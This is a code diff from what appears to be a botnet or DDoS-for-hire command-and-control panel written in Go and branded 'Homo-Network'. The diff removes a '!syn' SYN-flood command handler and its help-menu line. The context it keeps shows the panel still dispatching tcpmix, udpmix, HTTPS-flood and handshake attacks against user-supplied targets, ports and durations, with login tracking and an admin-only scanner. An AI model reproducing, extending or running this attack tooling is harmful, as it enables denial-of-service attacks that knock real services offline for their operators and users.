@@ -137,23 +137,6 @@ func CommandManager(conn net.Conn) {
 		Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)
 		go NewAttack(sencoding.Encode(s.Login+"|"+string(time.Now().Unix())), cmd[3], "tcpmix", cmd[1], cmd[2])
 
-	} else if strings.HasPrefix(string(line), "!syn") {
-		cmd := strings.Split(string(line), " ")
-		fmt.Println(cmd)
-
-		if len(cmd) < 3 {
-			CommandError("!syn <TARGET> <PORT> <DURATION>\n\r", "!syn 1.1.1.1 1093 60\n\r", conn)
-		}
-		if len(cmd) > 4 {
-			CommandError("!syn <TARGET> <PORT> <DURATION>\n\r", "!syn 1.1.1.1 1093 60\n\r", conn)
-		}
-
-		go server.Syn(cmd[1], cmd[3], cmd[2])
-		Log("🚀 New attack||Target: " + cmd[1] + "||Login: " + s.Login + "*")
-		fmt.Println(color.GreenString("\n[!] New attack\nTarget: " + cmd[1] + "\nLogin: " + s.Login))
-		Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)
-		go NewAttack(sencoding.Encode(s.Login+"|"+string(time.Now().Unix())), cmd[3], "syn", cmd[1], cmd[2])
-
 	} else if strings.HasPrefix(string(line), "scanner") {
 		if s.Login != config.GetConfig().Cnc.AdmLogin {
 			Print(gradient.Rainbow().Apply("Unknown command\n"), conn)
@@ -214,7 +197,6 @@ func CommandManager(conn net.Conn) {
 		conn.Write([]byte(color.HiWhiteString("!https: Basic https flood\t\t| Type: L7\n\r")))
 		conn.Write([]byte(color.HiWhiteString("!udpmix: Udp mix method\t\t\t| Type: L4\n\r")))
 		conn.Write([]byte(color.HiWhiteString("!tcpmix: Tcp mix method\t\t\t| Type: L4\n\r")))
-		conn.Write([]byte(color.HiWhiteString("!syn: Syn flood method\t\t\t| Type: L4\n\r")))
 		conn.Write([]byte(color.HiWhiteString("!handshake: Handshake method\t\t| Type: L4\n\r")))
 
 		conn.Write([]byte("\n"))
